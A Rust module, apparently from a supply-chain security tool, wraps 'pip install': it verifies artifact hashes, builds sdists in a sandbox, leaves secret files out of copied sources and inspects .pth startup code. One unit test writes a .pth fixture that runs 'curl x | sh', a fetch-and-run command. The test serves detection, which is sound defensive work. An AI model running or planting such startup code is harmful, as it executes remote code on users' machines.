//! pip: plan with `pip install --dry-run --report`, then greengate fetches
//! and verifies every artifact itself, inspects them, builds sdists and
//! source requirements (local directories, VCS checkouts) into wheels in
//! the sandbox, and installs wheels only.
//!
//! Two places run package code: resolving an sdist or source tree runs its
//! build backend (to read its metadata), and so does building it. Both run
//! in the sandbox when one is available. Installing a wheel runs no code —
//! but a `.pth` file in it runs at every Python start, so those are
//! inspected, in built wheels too.

use super::sandbox::{self, Isolation, Sandbox};
use super::{
    InstallOpts, Scratch, isolation_missing, must_halt, package_finding, plan_policy,
    print_install,
};
use crate::deps::{self, Ecosystem, Format, Lockfile, Package, Source};
use crate::modules::pip_audit::{extract_package_names, scan_python_signals};
use crate::report::{Check, Report, Severity};
use crate::utils::{http, terminal};
use anyhow::{Context, Result, bail};
use sha2::{Digest, Sha256};
use std::io::Read;
use std::path::{Path, PathBuf};

const MAX_ARTIFACT_BYTES: u64 = 2 * 1024 * 1024 * 1024;

/// One package from pip's installation report.
#[derive(Debug)]
struct Item {
    name: String,
    version: String,
    url: String,
    sha256: Option<String>,
    kind: Kind,
    /// For a VCS requirement: the VCS (`git`, `hg`…) and planned commit.
    vcs: Option<(String, String)>,
    /// The project's directory inside the source tree, if not its root.
    subdirectory: Option<String>,
}

#[derive(Debug, PartialEq)]
enum Kind {
    Wheel,
    Sdist,
    /// A VCS checkout or local directory: built by pip from source.
    Source,
}

fn parse_report(report: &serde_json::Value) -> Vec<Item> {
    report["install"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|i| {
            let di = &i["download_info"];
            let url = di["url"].as_str()?.to_string();
            let kind = if di.get("vcs_info").is_some() || di.get("dir_info").is_some() {
                Kind::Source
            } else if url.ends_with(".whl") {
                Kind::Wheel
            } else {
                Kind::Sdist
            };
            let vcs = di["vcs_info"]["vcs"]
                .as_str()
                .zip(di["vcs_info"]["commit_id"].as_str())
                .map(|(v, c)| (v.to_string(), c.to_string()));
            Some(Item {
                name: deps::normalize_python(i["metadata"]["name"].as_str()?),
                version: i["metadata"]["version"].as_str()?.to_string(),
                sha256: di["archive_info"]["hashes"]["sha256"]
                    .as_str()
                    .map(str::to_string),
                url,
                kind,
                vcs,
                subdirectory: di["subdirectory"].as_str().map(str::to_string),
            })
        })
        .collect()
}

fn planned_lockfile(path: &Path, items: &[Item]) -> Lockfile {
    let packages = items
        .iter()
        .map(|i| {
            let source = match i.kind {
                _ if i.url.starts_with("file:") => Source::Path {
                    path: i.url.clone(),
                },
                Kind::Source => Source::Git {
                    url: i.url.clone(),
                    rev: None,
                },
                _ => Source::registry(),
            };
            let mut p = Package::new(i.name.clone(), i.version.clone(), source);
            p.integrity = i.sha256.as_ref().map(|h| format!("sha256:{h}"));
            p.install_script = Some(i.kind != Kind::Wheel);
            p
        })
        .collect();
    Lockfile::synthetic(path, Format::Requirements, Ecosystem::PyPI, packages)
}

/// What is installed in the target environment now, as the base to compare.
fn installed(pip: &str) -> Option<Lockfile> {
    let out = std::process::Command::new(pip) // greengate: ignore — listing the environment
        .args(["list", "--format", "json", "--disable-pip-version-check"])
        .output()
        .ok()?;
    let list: Vec<serde_json::Value> = serde_json::from_slice(&out.stdout).ok()?;
    let packages = list
        .iter()
        .filter_map(|p| {
            Some(Package::new(
                deps::normalize_python(p["name"].as_str()?),
                p["version"].as_str()?,
                Source::registry(),
            ))
        })
        .collect();
    Some(Lockfile::synthetic(
        Path::new("<environment>"),
        Format::Requirements,
        Ecosystem::PyPI,
        packages,
    ))
}

/// `.pth` files at the root of a wheel, and their executable (`import`) lines.
fn wheel_pth(path: &Path) -> Result<Vec<(String, String)>> {
    let mut zip = zip::ZipArchive::new(std::fs::File::open(path)?)?;
    let mut out = Vec::new();
    for i in 0..zip.len() {
        let mut f = zip.by_index(i)?;
        let name = f.name().to_string();
        if name.contains('/') || !name.ends_with(".pth") {
            continue;
        }
        let mut text = String::new();
        f.by_ref().take(1024 * 1024).read_to_string(&mut text).ok();
        let code: Vec<&str> = text
            .lines()
            .filter(|l| l.starts_with("import ") || l.starts_with("import\t"))
            .collect();
        if !code.is_empty() {
            out.push((name, code.join("\n")));
        }
    }
    Ok(out)
}

/// `setup.py` from an sdist (`.tar.gz` or `.zip`), if it has one.
fn sdist_setup_py(path: &Path) -> Option<String> {
    let name = path.file_name()?.to_string_lossy().into_owned();
    let mut text = String::new();
    if name.ends_with(".zip") {
        let mut zip = zip::ZipArchive::new(std::fs::File::open(path).ok()?).ok()?;
        let idx = (0..zip.len()).find(|&i| {
            zip.by_index(i).is_ok_and(|f| {
                f.name().matches('/').count() == 1 && f.name().ends_with("/setup.py")
            })
        })?;
        zip.by_index(idx)
            .ok()?
            .take(1024 * 1024)
            .read_to_string(&mut text)
            .ok()?;
        return Some(text);
    }
    let gz = flate2::read::GzDecoder::new(std::fs::File::open(path).ok()?);
    let mut tar = tar::Archive::new(gz);
    for entry in tar.entries().ok()?.flatten() {
        let p = entry.path().ok()?.to_string_lossy().into_owned();
        if p.matches('/').count() == 1 && p.ends_with("/setup.py") {
            entry.take(1024 * 1024).read_to_string(&mut text).ok()?;
            return Some(text);
        }
    }
    None
}

/// A `file://` URL's path, percent-decoded.
fn file_url_path(url: &str) -> Option<PathBuf> {
    let raw = url.strip_prefix("file://")?.as_bytes();
    let mut out = Vec::with_capacity(raw.len());
    let mut i = 0;
    while i < raw.len() {
        let hex = raw
            .get(i + 1..i + 3)
            .and_then(|h| std::str::from_utf8(h).ok())
            .and_then(|h| u8::from_str_radix(h, 16).ok());
        match (raw[i], hex) {
            (b'%', Some(b)) => {
                out.push(b);
                i += 3;
            }
            (c, _) => {
                out.push(c);
                i += 1;
            }
        }
    }
    Some(PathBuf::from(String::from_utf8(out).ok()?))
}

/// Directories a source tree is copied without: dependency trees, caches
/// and virtualenvs (recognised by their `pyvenv.cfg`).
const COPY_SKIP: &[&str] = &[
    "node_modules",
    ".venv",
    "__pycache__",
    ".tox",
    ".nox",
    ".mypy_cache",
    ".pytest_cache",
];

/// Copy the source tree `from` to `to` for building: a build writes into
/// its tree (setuptools' `build/`, `*.egg-info`), so it builds a copy and
/// the original stays untouched. Secret files and `.git/config` (remote
/// URLs with credentials) are left out; the rest of `.git` stays, for
/// version plugins such as setuptools-scm. Directory symlinks are skipped.
fn copy_source(from: &Path, to: &Path) -> Result<()> {
    std::fs::create_dir_all(to)?;
    for e in std::fs::read_dir(from)?.flatten() {
        let name = e.file_name();
        let n = name.to_string_lossy();
        let path = e.path();
        let dest = to.join(&name);
        if e.file_type()?.is_dir() {
            if !COPY_SKIP.contains(&n.as_ref()) && !path.join("pyvenv.cfg").is_file() {
                copy_source(&path, &dest)?;
            }
        } else if path.is_file()
            && !sandbox::is_secret_file(&n)
            && !(n == "config" && from.file_name().is_some_and(|d| d == ".git"))
        {
            std::fs::copy(&path, &dest).with_context(|| format!("copying {}", path.display()))?;
        }
    }
    Ok(())
}

/// Check out a git requirement at its planned commit into `dest`, with
/// greengate's own git (no package code runs; the user's git credentials
/// work as they do for pip), then drop the checkout's `config` files, which
/// may hold credentials in remote URLs.
fn git_checkout(url: &str, commit: &str, dest: &Path) -> Result<()> {
    let git = |args: &[&str]| -> Result<()> {
        let status = std::process::Command::new("git") // greengate: ignore — fetching a VCS requirement, no package code
            .args(args)
            .status()
            .context("could not run git")?;
        if !status.success() {
            bail!("`git {}` failed ({status})", args.join(" "));
        }
        Ok(())
    };
    let d = dest.display().to_string();
    git(&["clone", "--quiet", "--no-checkout", url, &d])?;
    git(&[
        "-C",
        &d,
        "-c",
        "advice.detachedHead=false",
        "checkout",
        "--quiet",
        commit,
    ])?;
    git(&[
        "-C",
        &d,
        "submodule",
        "update",
        "--quiet",
        "--init",
        "--recursive",
    ])?;
    let mut stack = vec![dest.join(".git")];
    while let Some(dir) = stack.pop() {
        let _ = std::fs::remove_file(dir.join("config"));
        stack.extend(
            std::fs::read_dir(dir.join("modules"))
                .into_iter()
                .flatten()
                .flatten()
                .map(|e| e.path()),
        );
    }
    Ok(())
}

/// Where pip builds a source requirement from (local directories and git
/// checkouts are prepared under `dest`; other VCS requirements are cloned
/// by pip itself, pinned to the planned commit), and its `setup.py`, when
/// it can be read before building.
fn prepare_source(item: &Item, dest: &Path) -> Result<(String, Option<String>)> {
    let tree = match (&item.vcs, file_url_path(&item.url)) {
        (None, Some(dir)) => {
            copy_source(&dir, dest)?;
            dest.to_path_buf()
        }
        (Some((vcs, commit)), _) if vcs == "git" => {
            git_checkout(&item.url, commit, dest)?;
            dest.to_path_buf()
        }
        (Some((vcs, commit)), _) => {
            let sub = item
                .subdirectory
                .as_ref()
                .map(|s| format!("#subdirectory={s}"))
                .unwrap_or_default();
            return Ok((format!("{vcs}+{}@{commit}{sub}", item.url), None));
        }
        (None, None) => bail!("{}: unsupported source requirement {}", item.name, item.url),
    };
    let root = match &item.subdirectory {
        Some(s) => tree.join(s),
        None => tree,
    };
    let setup = std::fs::read_to_string(root.join("setup.py")).ok();
    Ok((root.display().to_string(), setup))
}

fn sha256_file(path: &Path) -> Result<String> {
    let mut f = std::fs::File::open(path)?;
    let mut h = Sha256::new();
    std::io::copy(&mut f, &mut h)?;
    Ok(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
}

pub fn run(opts: InstallOpts<'_>) -> Result<Report> {
    let Some((sub, rest)) = opts.args.split_first() else {
        bail!(
            "expected a pip install command, e.g. `greengate install pip install -r requirements.txt`"
        );
    };
    if sub != "install" {
        bail!("`pip {sub}` is not an install; greengate install wraps `pip install`");
    }
    if rest
        .iter()
        .any(|a| a == "-e" || a == "--editable" || a.starts_with("--target") || a == "-t")
    {
        bail!(
            "editable and --target installs are not supported by greengate install yet; use `greengate pip-install`"
        );
    }
    if rest
        .iter()
        .any(|a| a == "--report" || a.starts_with("--report="))
    {
        bail!("--report is set by greengate install itself (the plan is read from it)");
    }
    let pip = opts.pip.as_str();
    let project = std::env::current_dir()?;
    let mut report = Report::new("install");
    report.no_fail = opts.no_fail;
    let scratch = Scratch::new()?;
    let tmp = scratch.0.join("tmp");
    std::fs::create_dir_all(&tmp)?;
    let isolation = sandbox::detect(opts.isolate)?;
    if isolation_missing(
        &mut report,
        &opts,
        isolation,
        "resolving runs the build code of any sdist, so pip was not run",
    ) {
        return Ok(report);
    }

    // ── 1. Plan ──────────────────────────────────────────────────────────────
    // Resolving an sdist runs its build backend: do it in the sandbox (with
    // network, to reach the index) so that code reaches nothing else.
    terminal::info(
        "Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...",
    );
    let plan_path = scratch.0.join("plan.json");
    let mut args: Vec<String> = vec![
        "install".into(),
        "--dry-run".into(),
        "--ignore-installed".into(),
        "--quiet".into(),
        "--disable-pip-version-check".into(),
        "--report".into(),
        plan_path.display().to_string(),
    ];
    args.extend(rest.iter().cloned());
    let plan_in = |project_copy: Option<&Path>| -> Result<(std::process::Output, String)> {
        let planner = Sandbox {
            isolation,
            project: &project,
            tmp: &tmp,
            writable: vec![scratch.0.clone()],
            read_only: Vec::new(),
            inner: Vec::new(),
            network: true,
            env_allow: &opts.policy.env_allow,
            project_copy,
        };
        let out = planner
            .command(pip, &args)
            .env("PIP_CACHE_DIR", tmp.join("pip-cache"))
            .output()
            .context("could not run pip")?;
        let log = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        Ok((out, log))
    };
    let read_only = |log: &str| log.contains("Read-only file system") || log.contains("EROFS");
    let (mut out, mut log) = plan_in(None)?;
    if !out.status.success() && read_only(&log) && isolation == Isolation::Bwrap {
        // A local setuptools project writes its metadata into its own tree
        // while pip resolves it: resolve again over a throwaway copy of the
        // project, so that works and the project still does not change.
        terminal::info(
            "Plan: a build wrote into the project; resolving again over a copy of it...",
        );
        let copy = scratch.0.join("project");
        copy_source(&project, &copy)?;
        (out, log) = plan_in(Some(&copy))?;
    }
    if !out.status.success() {
        eprint!("{log}");
        if read_only(&log) {
            report.findings.push(package_finding(
                "INSTALL/BlockedWrite",
                Severity::High,
                "build backend",
                "",
                &project,
                "an sdist's build code, run while resolving, tried to write outside the sandbox; it was refused and nothing was installed".into(),
            ));
            print_install(&report, "Install halted at the plan.");
            return Ok(report);
        }
        bail!("`pip install --dry-run` failed ({})", out.status);
    }
    let plan: serde_json::Value = serde_json::from_slice(&std::fs::read(&plan_path)?)?;
    let items = parse_report(&plan);
    let planned = planned_lockfile(&scratch.0.join("requirements.txt"), &items);
    let current = installed(pip);
    let named = extract_package_names(rest);
    plan_policy(
        &mut report,
        &planned,
        current.as_ref(),
        Some((
            crate::modules::slopsquat::Ecosystem::Pypi,
            &named,
            &opts.policy.allow_pip_packages,
        )),
        &opts,
    )?;
    let sdists: Vec<String> = items
        .iter()
        .filter(|i| i.kind == Kind::Sdist)
        .map(|i| format!("{}=={}", i.name, i.version))
        .collect();
    if !sdists.is_empty() && isolation == Isolation::None {
        report.warnings.push(package_finding(
            "INSTALL/SourceBuild",
            Severity::Medium,
            &sdists.join(", "),
            "",
            &project,
            "resolving these sdists ran their build backends without isolation".into(),
        ));
    }
    if must_halt(&report, &opts) {
        eprintln!("Install halted at the plan: nothing was installed.");
        return Ok(report);
    }

    // ── 2–3. Fetch and verify ────────────────────────────────────────────────
    let before: std::collections::HashSet<(String, String)> = current
        .as_ref()
        .map(|c| {
            c.dependencies()
                .map(|p| (p.name.clone(), p.version.clone()))
                .collect()
        })
        .unwrap_or_default();
    let todo: Vec<&Item> = items
        .iter()
        .filter(|i| !before.contains(&(i.name.clone(), i.version.clone())))
        .collect();
    let dl = scratch.0.join("dl");
    std::fs::create_dir_all(&dl)?;
    terminal::info(&format!(
        "Fetch: downloading {} artifact(s) and checking their hashes...",
        todo.iter().filter(|i| i.kind != Kind::Source).count()
    ));
    let mut files: Vec<(&Item, PathBuf)> = Vec::new();
    for item in todo.iter().filter(|i| i.kind != Kind::Source) {
        let file = item
            .url
            .rsplit('/')
            .next()
            .unwrap_or("artifact")
            .split('#')
            .next()
            .unwrap_or("artifact");
        let dest = dl.join(file);
        // `--find-links` archives on disk arrive as file:// URLs.
        if let Some(local) = item.url.strip_prefix("file://") {
            std::fs::copy(local, &dest).with_context(|| format!("copying {local}"))?;
        } else {
            http::download(&item.url, &dest, MAX_ARTIFACT_BYTES, None)
                .with_context(|| format!("downloading {}=={}", item.name, item.version))?;
        }
        match &item.sha256 {
            Some(expected) => {
                let actual = sha256_file(&dest)?;
                if !actual.eq_ignore_ascii_case(expected) {
                    report.findings.push(package_finding(
                        "INSTALL/HashMismatch",
                        Severity::High,
                        &item.name,
                        &item.version,
                        &dest,
                        format!("{file} has sha256 {actual}, but the index published {expected}"),
                    ));
                    continue;
                }
            }
            None => report.warnings.push(package_finding(
                "INSTALL/NoHash",
                Severity::Medium,
                &item.name,
                &item.version,
                &dest,
                format!("{file}: the index published no hash to verify against"),
            )),
        }
        files.push((item, dest));
    }
    // Source requirements: local directories copied, git checkouts made at
    // the planned commit — built from there, never in place.
    let mut sources: Vec<(&Item, String, Option<String>)> = Vec::new();
    for (n, item) in todo.iter().filter(|i| i.kind == Kind::Source).enumerate() {
        let dest = scratch.0.join("src").join(format!("{n}-{}", item.name));
        let (spec, setup) = prepare_source(item, &dest)
            .with_context(|| format!("preparing {} from {}", item.name, item.url))?;
        sources.push((item, spec, setup));
    }
    report
        .checks
        .push(Check::passed("install:fetch").with_source(format!(
            "{} artifact(s) downloaded by greengate and checked against the index's sha256{}",
            files.len(),
            if sources.is_empty() {
                String::new()
            } else {
                format!("; {} source requirement(s) prepared", sources.len())
            }
        )));
    if !report.findings.is_empty() && !opts.no_fail {
        print_install(
            &report,
            "Install halted: an artifact did not match its published hash.",
        );
        return Ok(report);
    }

    // ── 4. Inspect ───────────────────────────────────────────────────────────
    let allowlisted = |item: &Item| {
        opts.policy
            .allow_pip_packages
            .iter()
            .any(|a| deps::normalize_python(a) == item.name)
    };
    // Whether a source build may go ahead, judged by its `setup.py`: a
    // suspicious one builds only isolated or allowlisted.
    let may_build = |report: &mut Report, item: &Item, setup: &str, path: &Path| {
        let signals = scan_python_signals(setup);
        let suspicious = !signals.is_empty() || super::inspect::encoded_blob(setup).is_some();
        if suspicious && isolation == Isolation::None && !allowlisted(item) {
            report.findings.push(package_finding(
                "INSTALL/SuspiciousScript",
                Severity::High,
                &item.name,
                &item.version,
                path,
                format!(
                    "setup.py: {} — not built (no isolation available; allowlist it to build it)",
                    signals.join(", ")
                ),
            ));
            return false;
        }
        if suspicious {
            report.warnings.push(package_finding(
                "INSTALL/SuspiciousScript",
                Severity::Medium,
                &item.name,
                &item.version,
                path,
                format!(
                    "setup.py: {} — built {}",
                    signals.join(", "),
                    if allowlisted(item) {
                        "because it is allowlisted"
                    } else {
                        "isolated"
                    }
                ),
            ));
        }
        true
    };
    let mut startup_code: Vec<String> = Vec::new();
    // What pip builds into wheels: sdist archives and source trees.
    let mut to_build: Vec<(&Item, String)> = Vec::new();
    for (item, path) in &files {
        let allowlisted = allowlisted(item);
        match item.kind {
            Kind::Wheel => {
                for (pth, code) in wheel_pth(path).unwrap_or_default() {
                    startup_code.push(format!("{}=={} ({pth})", item.name, item.version));
                    let signals = super::inspect::pth_signals(&code);
                    if !signals.is_empty() {
                        let f = package_finding(
                            "INSTALL/StartupCode",
                            if allowlisted {
                                Severity::Medium
                            } else {
                                Severity::High
                            },
                            &item.name,
                            &item.version,
                            path,
                            format!("{pth} runs at every Python start: {}", signals.join(", ")),
                        );
                        if allowlisted {
                            report.warnings.push(f)
                        } else {
                            report.findings.push(f)
                        }
                    }
                }
            }
            Kind::Sdist => {
                let setup = sdist_setup_py(path).unwrap_or_default();
                if may_build(&mut report, item, &setup, path) {
                    to_build.push((item, path.display().to_string()));
                }
            }
            Kind::Source => {}
        }
    }
    for (item, spec, setup) in &sources {
        if isolation == Isolation::None {
            report.warnings.push(package_finding(
                "INSTALL/SourceBuild",
                Severity::Medium,
                &item.name,
                &item.version,
                &project,
                format!("built from {} without isolation", item.url),
            ));
        }
        if may_build(&mut report, item, setup.as_deref().unwrap_or(""), &project) {
            to_build.push((item, spec.clone()));
        }
    }
    report
        .checks
        .push(Check::passed("install:inspect").with_source(format!(
            "{} sdist(s) and source tree(s) to build; {} package(s) with startup (.pth) code{}",
            to_build.len(),
            startup_code.len(),
            if startup_code.is_empty() {
                String::new()
            } else {
                format!(": {}", startup_code.join(", "))
            }
        )));
    if opts.plan_only {
        print_install(
            &report,
            "Plan only: nothing was installed and no package code ran after planning.",
        );
        return Ok(report);
    }
    if must_halt(&report, &opts) {
        print_install(
            &report,
            "Install halted before building or installing anything.",
        );
        return Ok(report);
    }

    // ── 5. Build sdists and source trees (sandboxed), install wheels ─────────
    let built = scratch.0.join("built");
    std::fs::create_dir_all(&built)?;
    for (item, spec) in &to_build {
        terminal::info(&format!(
            "Building {}=={} from source...",
            item.name, item.version
        ));
        // Building needs the index for build requirements; writes stay in
        // the scratch directory, credentials stay masked.
        let builder = Sandbox {
            isolation,
            project: &project,
            tmp: &tmp,
            writable: vec![scratch.0.clone()],
            read_only: Vec::new(),
            inner: Vec::new(),
            network: true,
            env_allow: &opts.policy.env_allow,
            project_copy: None,
        };
        let out = builder
            .command(
                pip,
                &[
                    "wheel".into(),
                    "--no-deps".into(),
                    "--quiet".into(),
                    "--disable-pip-version-check".into(),
                    "-w".into(),
                    built.display().to_string(),
                    spec.clone(),
                ],
            )
            .env("PIP_CACHE_DIR", tmp.join("pip-cache"))
            .output()?;
        if !out.status.success() {
            report.checks.push(Check::error(
                format!("install:build:{}", item.name),
                format!(
                    "building it from source failed ({}): {}",
                    out.status,
                    String::from_utf8_lossy(&out.stderr)
                        .lines()
                        .last()
                        .unwrap_or("")
                ),
            ));
        }
    }
    let mut wheels: Vec<PathBuf> = files
        .iter()
        .filter(|(i, _)| i.kind == Kind::Wheel)
        .map(|(_, p)| p.clone())
        .collect();
    for e in std::fs::read_dir(&built)?.flatten() {
        let p = e.path();
        for (pth, code) in wheel_pth(&p).unwrap_or_default() {
            let signals = super::inspect::pth_signals(&code);
            if !signals.is_empty() {
                report.findings.push(package_finding(
                    "INSTALL/StartupCode",
                    Severity::High,
                    &p.file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_default(),
                    "",
                    &p,
                    format!(
                        "the wheel built from source adds {pth}, which runs at every Python start: {}",
                        signals.join(", ")
                    ),
                ));
            }
        }
        wheels.push(p);
    }
    if !report.findings.is_empty() && !opts.no_fail {
        print_install(&report, "Install halted before installing anything.");
        return Ok(report);
    }
    if !wheels.is_empty() {
        terminal::info(&format!(
            "Install: {} wheel(s), no package code runs...",
            wheels.len()
        ));
        let status = std::process::Command::new(pip) // greengate: ignore — installing verified wheels
            .args([
                "install",
                "--no-index",
                "--no-deps",
                "--disable-pip-version-check",
            ])
            .args(&wheels)
            .status()?;
        if !status.success() {
            bail!("`pip install` of the verified wheels failed ({status})");
        }
    }
    report
        .checks
        .push(Check::passed("install:execute").with_source(format!(
            "{} wheel(s) installed; {} built from source — {}",
            wheels.len(),
            to_build.len(),
            isolation.describe(true)
        )));
    print_install(&report, "");
    Ok(report)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn report_items() {
        let r = serde_json::json!({"install": [
            {"metadata": {"name": "Requests", "version": "2.31.0"},
             "download_info": {"url": "https://files/requests-2.31.0-py3-none-any.whl",
                               "archive_info": {"hashes": {"sha256": "abc"}}}},
            {"metadata": {"name": "sdpkg", "version": "1.0"},
             "download_info": {"url": "https://files/sdpkg-1.0.tar.gz", "archive_info": {}}},
            {"metadata": {"name": "mine", "version": "0.1"},
             "download_info": {"url": "file:///src/mine", "dir_info": {}}},
            {"metadata": {"name": "remote", "version": "2.0"},
             "download_info": {"url": "https://git.example/remote", "subdirectory": "py",
                               "vcs_info": {"vcs": "git", "commit_id": "c0ffee"}}}
        ]});
        let items = parse_report(&r);
        assert_eq!(
            items.iter().map(|i| &i.kind).collect::<Vec<_>>(),
            [&Kind::Wheel, &Kind::Sdist, &Kind::Source, &Kind::Source]
        );
        assert_eq!(items[2].vcs, None);
        assert_eq!(items[3].vcs, Some(("git".into(), "c0ffee".into())));
        assert_eq!(items[3].subdirectory.as_deref(), Some("py"));
        assert_eq!(items[0].name, "requests");
        let lock = planned_lockfile(Path::new("x/requirements.txt"), &items);
        assert_eq!(lock.packages[0].integrity.as_deref(), Some("sha256:abc"));
        assert!(matches!(lock.packages[2].source, Source::Path { .. }));
    }

    #[test]
    fn file_urls_are_decoded() {
        assert_eq!(
            file_url_path("file:///home/a%20b/pkg"),
            Some(PathBuf::from("/home/a b/pkg"))
        );
        assert_eq!(file_url_path("https://x"), None);
    }

    fn item(url: &str, vcs: Option<(&str, &str)>) -> Item {
        Item {
            name: "mine".into(),
            version: "0.1".into(),
            url: url.into(),
            sha256: None,
            kind: Kind::Source,
            vcs: vcs.map(|(v, c)| (v.into(), c.into())),
            subdirectory: None,
        }
    }

    #[test]
    fn local_sources_are_built_from_a_copy_without_secrets() {
        let src = tempfile::tempdir().unwrap();
        let out = tempfile::tempdir().unwrap();
        let s = src.path();
        std::fs::write(s.join("setup.py"), "from setuptools import setup; setup()").unwrap();
        std::fs::write(s.join(".env"), "DATABASE_URL=x").unwrap();
        std::fs::create_dir_all(s.join("pkg")).unwrap();
        std::fs::write(s.join("pkg/__init__.py"), "").unwrap();
        std::fs::write(s.join("pkg/.npmrc"), "//r/:_authToken=x").unwrap();
        std::fs::create_dir_all(s.join(".git")).unwrap();
        std::fs::write(s.join(".git/HEAD"), "ref: refs/heads/main").unwrap();
        std::fs::write(s.join(".git/config"), "[remote]").unwrap();
        std::fs::create_dir_all(s.join("env/bin")).unwrap();
        std::fs::write(s.join("env/pyvenv.cfg"), "").unwrap();
        let url = format!("file://{}", s.display());
        let dest = out.path().join("copy");
        let (spec, setup) = prepare_source(&item(&url, None), &dest).unwrap();
        assert_eq!(spec, dest.display().to_string());
        assert!(setup.unwrap().contains("setup()"));
        assert!(dest.join("pkg/__init__.py").is_file());
        assert!(dest.join(".git/HEAD").is_file());
        for gone in [".env", "pkg/.npmrc", ".git/config", "env"] {
            assert!(!dest.join(gone).exists(), "{gone} left out");
        }
    }

    #[test]
    fn git_sources_are_checked_out_at_the_planned_commit() {
        let repo = tempfile::tempdir().unwrap();
        let out = tempfile::tempdir().unwrap();
        let r = repo.path();
        let git = |args: &[&str]| {
            let o = std::process::Command::new("git")
                .args(["-c", "user.email=t@t", "-c", "user.name=t", "-C"])
                .arg(r)
                .args(args)
                .output()
                .unwrap();
            assert!(o.status.success(), "{}", String::from_utf8_lossy(&o.stderr));
            String::from_utf8_lossy(&o.stdout).trim().to_string()
        };
        git(&["init", "-q"]);
        std::fs::write(r.join("setup.py"), "v1").unwrap();
        git(&["add", "."]);
        git(&["commit", "-qm", "1"]);
        let planned = git(&["rev-parse", "HEAD"]);
        std::fs::write(r.join("setup.py"), "v2").unwrap();
        git(&["commit", "-qam", "2"]);
        let dest = out.path().join("co");
        let url = format!("file://{}", r.display());
        let (spec, setup) = prepare_source(&item(&url, Some(("git", &planned))), &dest).unwrap();
        assert_eq!(spec, dest.display().to_string());
        assert_eq!(setup.as_deref(), Some("v1"));
        assert!(!dest.join(".git/config").exists());
        // Other VCS: pip clones it, pinned.
        let (spec, setup) =
            prepare_source(&item("https://hg.example/x", Some(("hg", "abc"))), &dest).unwrap();
        assert_eq!(spec, "hg+https://hg.example/x@abc");
        assert_eq!(setup, None);
    }

    #[test]
    fn pth_startup_code_is_found() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("x-1.0-py3-none-any.whl");
        let mut w = zip::ZipWriter::new(std::fs::File::create(&path).unwrap());
        let o = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        w.start_file("x.pth", o).unwrap();
        std::io::Write::write_all(&mut w, b"/some/path\nimport os; os.system('curl x | sh')\n")
            .unwrap();
        w.start_file("x/__init__.pth", o).unwrap(); // not at the root: not loaded
        std::io::Write::write_all(&mut w, b"import y\n").unwrap();
        w.finish().unwrap();
        let found = wheel_pth(&path).unwrap();
        assert_eq!(found.len(), 1);
        assert!(found[0].1.contains("os.system"));
    }
}
